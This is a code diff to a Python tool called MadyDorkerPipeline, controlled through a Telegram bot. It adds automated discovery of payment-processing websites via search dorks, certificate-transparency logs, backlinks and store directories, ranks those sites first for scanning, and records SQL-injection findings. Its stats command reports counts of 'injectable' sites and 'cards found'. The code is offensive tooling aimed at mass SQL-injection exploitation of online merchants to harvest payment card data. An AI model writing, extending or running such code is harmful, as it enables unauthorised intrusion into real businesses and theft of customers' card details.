@@ -258,8 +258,13 @@ class MadyDorkerPipeline:
                 proxy_manager=self.proxy_manager,
                 searcher=self.searcher,
                 max_concurrent=20,
+                db=self.db,
             )
-            logger.info("🎯 Payment Discovery Engine enabled")
+            # Load known payment domains for priority scoring
+            self._payment_domains = self.db.get_payment_site_domains()
+            logger.info(f"🎯 Payment Discovery Engine enabled ({len(self._payment_domains)} known sites)")
+        else:
+            self._payment_domains = set()
 
         # Configure Firecrawl in search engine
         if self.config.firecrawl_enabled and self.config.firecrawl_api_key:
@@ -898,6 +903,12 @@ class MadyDorkerPipeline:
             score += 8
         elif path.endswith(".jsp"):
             score += 8
+
+        # ★ Payment-confirmed domain → massive priority boost
+        if hasattr(self, '_payment_domains') and self._payment_domains:
+            domain = parsed.netloc.lower()
+            if domain in self._payment_domains:
+                score += 100  # Confirmed payment site goes first
 
         return score
 
@@ -3634,6 +3645,11 @@ class MadyDorkerPipeline:
         status_task = asyncio.create_task(self._status_loop())
         export_task = asyncio.create_task(self._export_loop())
 
+        # v3.3: Start autonomous payment discovery loop
+        pay_discover_task = None
+        if self.payment_discoverer:
+            pay_discover_task = asyncio.create_task(self._payment_discovery_loop())
+
         try:
             cycle = 0
             while self.running:
@@ -3642,6 +3658,39 @@ class MadyDorkerPipeline:
                 if self.config.max_cycles > 0 and cycle > self.config.max_cycles:
                     logger.info(f"Max cycles ({self.config.max_cycles}) reached")
                     break
+
+                # v3.3: Inject unscanned payment sites at top of each cycle
+                if self.payment_discoverer:
+                    try:
+                        unscanned = self.db.get_unscanned_payment_sites(
+                            max_age_hours=getattr(self.config, 'pay_rescan_hours', 48),
+                            limit=50,
+                        )
+                        if unscanned:
+                            pay_urls = [s['url'] for s in unscanned]
+                            logger.info(f"🎯 Injecting {len(pay_urls)} payment sites for priority scan")
+                            batch_results = []
+                            batch_findings = []
+                            tasks = []
+                            for url in pay_urls:
+                                if not self.running:
+                                    break
+                                tasks.append(
+                                    self._process_url_safe(url, batch_results, batch_findings)
+                                )
+                            if tasks:
+                                await asyncio.gather(*tasks, return_exceptions=True)
+                                # Mark as scanned
+                                for s in unscanned[:len(tasks)]:
+                                    found_sqli = any(s['domain'] in str(f) for f in batch_findings)
+                                    self.db.mark_payment_site_scanned(s['domain'], sqli_found=found_sqli)
+                                if batch_findings:
+                                    await self._send_progress(
+                                        f"🎯💰 Payment scan: {len(batch_findings)} findings "
+                                        f"from {len(pay_urls)} payment sites!"
+                                    )
+                    except Exception as e:
+                        logger.debug(f"Payment site injection error: {e}")
 
                 await self.run_dork_cycle()
 
@@ -3661,8 +3710,13 @@ class MadyDorkerPipeline:
         finally:
             status_task.cancel()
             export_task.cancel()
+            if pay_discover_task:
+                pay_discover_task.cancel()
             # Wait for cancelled tasks to finish before closing DB
-            for _t in [status_task, export_task]:
+            _all_tasks = [status_task, export_task]
+            if pay_discover_task:
+                _all_tasks.append(pay_discover_task)
+            for _t in _all_tasks:
                 try:
                     await _t
                 except (asyncio.CancelledError, Exception):
@@ -3785,6 +3839,109 @@ class MadyDorkerPipeline:
                 break
             except Exception as e:
                 logger.error(f"Export loop error: {e}")
+
+    async def _payment_discovery_loop(self):
+        """Autonomous payment site discovery — runs every pay_discovery_interval seconds."""
+        _interval = getattr(self.config, 'pay_discovery_interval', 7200)  # Default: 2 hours
+        _initial_delay = 300  # 5 min delay to let pipeline warm up first
+        
+        await asyncio.sleep(_initial_delay)
+        
+        while self.running:
+            try:
+                logger.info("[PayDiscover] 🎯 Starting autonomous discovery cycle...")
+                
+                async def _progress(msg):
+                    await self._send_progress(msg)
+                
+                # Run full discovery (dorks + CT + tech)
+                results = await self.payment_discoverer.run_full_discovery(
+                    methods=["dorks", "ct", "tech"],
+                    report_callback=_progress,
+                )
+                
+                if results:
+                    # Persist to DB
+                    new_count = 0
+                    for site in results:
+                        try:
+                            known = self.db.get_payment_site_domains()
+                            if site.domain not in known:
+                                new_count += 1
+                            self.db.save_payment_site(
+                                domain=site.domain,
+                                url=site.url,
+                                gateway=site.gateway,
+                                method=site.method,
+                                confidence=site.confidence,
+                                has_params=site.has_params,
+                                html_matches=site.html_matches,
+                            )
+                        except Exception as e:
+                            logger.debug(f"[PayDiscover] DB save error: {e}")
+                    
+                    # Refresh priority domain cache
+                    self._payment_domains = self.db.get_payment_site_domains()
+                    
+                    # Run backlink expansion on new high-confidence sites
+                    high_conf = [s for s in results if s.confidence >= 0.7]
+                    if high_conf and hasattr(self.payment_discoverer, 'discover_via_backlinks'):
+                        try:
+                            seed_urls = [s.url for s in high_conf[:20]]
+                            await self.payment_discoverer.discover_via_backlinks(
+                                seed_urls, report_callback=_progress
+                            )
+                            # Persist backlink discoveries too
+                            for site in self.payment_discoverer.discovered.values():
+                                if site.domain not in self._payment_domains:
+                                    self.db.save_payment_site(
+                                        domain=site.domain, url=site.url,
+                                        gateway=site.gateway, method=site.method,
+                                        confidence=site.confidence,
+                                        has_params=site.has_params,
+                                        html_matches=site.html_matches,
+                                    )
+                            self._payment_domains = self.db.get_payment_site_domains()
+                        except Exception as e:
+                            logger.debug(f"[PayDiscover] Backlink expansion error: {e}")
+                    
+                    # Run store directories periodically
+                    if hasattr(self.payment_discoverer, 'discover_via_store_directories'):
+                        try:
+                            await self.payment_discoverer.discover_via_store_directories(
+                                report_callback=_progress
+                            )
+                            for site in self.payment_discoverer.discovered.values():
+                                if site.domain not in self._payment_domains:
+                                    self.db.save_payment_site(
+                                        domain=site.domain, url=site.url,
+                                        gateway=site.gateway, method=site.method,
+                                        confidence=site.confidence,
+                                        has_params=site.has_params,
+                                        html_matches=site.html_matches,
+                                    )
+                            self._payment_domains = self.db.get_payment_site_domains()
+                        except Exception as e:
+                            logger.debug(f"[PayDiscover] Store directory error: {e}")
+
+                    total = self.db.payment_site_count()
+                    await self._send_progress(
+                        f"🎯 <b>Auto-Discovery Complete</b>\n\n"
+                        f"💳 New sites: <b>{new_count}</b>\n"
+                        f"📦 Total in DB: <b>{total}</b>\n"
+                        f"⏰ Next run in {_interval // 3600}h {(_interval % 3600) // 60}m"
+                    )
+                
+                logger.info(f"[PayDiscover] Cycle done. Next in {_interval}s. "
+                           f"Total payment sites: {self.db.payment_site_count()}")
+                
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                logger.error(f"[PayDiscover] Loop error: {e}", exc_info=True)
+            
+            # Wait for next discovery cycle
+            await asyncio.sleep(_interval)
 
     async def _write_export(self) -> Optional[str]:
         """Write comprehensive exports in .txt, .json, and .csv formats."""
@@ -7416,21 +7573,26 @@ async def cmd_paydiscover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Parse args: /paydiscover [methods] [gateways]
-    # e.g. /paydiscover dorks,ct stripe,paypal
+    # e.g. /paydiscover dorks,ct,backlinks stripe,paypal
+    # e.g. /paydiscover all  (runs all 6 methods)
     methods = ["dorks", "ct", "tech"]
     gateways = None
     
     if context.args:
         if len(context.args) >= 1:
-            methods = [m.strip() for m in context.args[0].split(",")]
+            if context.args[0].lower() == "all":
+                methods = ["dorks", "ct", "tech", "verify", "backlinks", "directories"]
+            else:
+                methods = [m.strip() for m in context.args[0].split(",")]
         if len(context.args) >= 2:
             gateways = [g.strip() for g in context.args[1].split(",")]
     
-    # Create fresh discoverer
+    # Create fresh discoverer with DB persistence
     p.payment_discoverer = PaymentDiscovery(
         gateways=gateways,
         proxy_manager=p.proxy_manager,
         searcher=p.searcher,
+        db=p.db,
         max_concurrent=20,
     )
     
@@ -7514,7 +7676,10 @@ async def cmd_paydiscover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"  Phase 1: Dork discovery (payment JS includes)\n"
         f"  Phase 2: CT log subdomain search\n"
         f"  Phase 3: Technology fingerprint search\n"
-        f"  Phase 4: Auto-scan all discovered sites\n\n"
+        f"  Phase 4: Backlink expansion (if selected)\n"
+        f"  Phase 5: Store directories (if selected)\n"
+        f"  Phase 6: Auto-scan all discovered sites\n\n"
+        f"  /paydiscover all — run ALL 6 methods\n"
         f"  Use /paystop to cancel | /paystats for progress",
         parse_mode="HTML",
     )
@@ -7541,38 +7706,66 @@ async def cmd_paystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_owner(update): return
     
     p = get_pipeline()
-    if not p.payment_discoverer:
-        await update.message.reply_text("ℹ️ No payment discovery has been run yet.")
-        return
+    
+    # Always show DB stats even if no discoverer running
+    db_stats = p.db.get_payment_stats() if hasattr(p.db, 'get_payment_stats') else None
     
     d = p.payment_discoverer
-    running = "🟢 Running" if d._running else "🔴 Stopped"
+    running = "🟢 Running" if (d and d._running) else "🔴 Stopped"
     
+    # Live session stats
+    session_lines = ""
     gw_lines = []
-    for gw, count in sorted(
-        d.stats["gateways_found"].items(),
-        key=lambda x: x[1], reverse=True
-    )[:15]:
-        gw_lines.append(f"  {gw}: <b>{count}</b>")
-    
     top_sites = []
-    for site in sorted(d.discovered.values(), key=lambda s: s.confidence, reverse=True)[:10]:
-        top_sites.append(
-            f"  {'💉' if site.has_params else '🌐'} {site.domain} "
-            f"({site.gateway}, {site.confidence:.0%})"
+    
+    if d and d.discovered:
+        for gw, count in sorted(
+            d.stats["gateways_found"].items(),
+            key=lambda x: x[1], reverse=True
+        )[:15]:
+            gw_lines.append(f"  {gw}: <b>{count}</b>")
+        
+        for site in sorted(d.discovered.values(), key=lambda s: s.confidence, reverse=True)[:10]:
+            top_sites.append(
+                f"  {'💉' if site.has_params else '🌐'} {site.domain} "
+                f"({site.gateway}, {site.confidence:.0%})"
+            )
+        
+        session_lines = (
+            f"\n<b>📡 Live Session:</b> {running}\n"
+            f"  🔍 Dork queries: {d.stats['dork_queries']}\n"
+            f"  📜 CT queries: {d.stats['ct_queries']}\n"
+            f"  🔗 Backlink queries: {d.stats.get('backlink_queries', 0)}\n"
+            f"  🏪 Directory queries: {d.stats.get('directory_queries', 0)}\n"
+            f"  🔎 HTML verified: {d.stats['html_scans']}\n"
+            f"  🔗 URLs checked: {d.stats['urls_checked']}\n"
+            f"  💳 Session sites: {d.found_count}\n"
+        )
+    
+    # DB aggregate stats
+    db_lines = ""
+    if db_stats:
+        db_gw = "\n".join(f"  {gw}: <b>{cnt}</b>" for gw, cnt in list(db_stats.get('gateways', {}).items())[:10])
+        db_lines = (
+            f"\n<b>📦 Database (all-time):</b>\n"
+            f"  💳 Total sites: <b>{db_stats['total']}</b>\n"
+            f"  ✅ Active: {db_stats['active']}\n"
+            f"  💉 Injectable: {db_stats['injectable']}\n"
+            f"  🔓 SQLi found: {db_stats['total_sqli']}\n"
+            f"  💳 Cards found: {db_stats['total_cards']}\n"
+            f"  🔍 Total scans: {db_stats['total_scans']}\n"
+            f"  📊 Avg confidence: {db_stats['avg_confidence']:.0%}\n"
+            f"\n<b>DB Gateways:</b>\n{db_gw or '  (none)'}\n"
         )
     
     await update.message.reply_text(
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"  🎯 <b>Payment Discovery Stats</b> {running}\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"  💳 Sites found: <b>{d.found_count}</b>\n"
-        f"  🔍 Dork queries: {d.stats['dork_queries']}\n"
-        f"  📜 CT queries: {d.stats['ct_queries']}\n"
-        f"  🔎 HTML verified: {d.stats['html_scans']}\n"
-        f"  🔗 URLs checked: {d.stats['urls_checked']}\n\n"
-        f"<b>Gateway Breakdown:</b>\n" + ("\n".join(gw_lines) or "  (none yet)") +
-        f"\n\n<b>Top Sites:</b>\n" + ("\n".join(top_sites) or "  (none yet)"),
+        f"  🎯 <b>Payment Discovery Stats</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{session_lines}"
+        f"{db_lines}"
+        f"\n<b>Gateway Breakdown (session):</b>\n" + ("\n".join(gw_lines) or "  (none)") +
+        f"\n\n<b>Top Sites (session):</b>\n" + ("\n".join(top_sites) or "  (none)"),
         parse_mode="HTML",
     )
 
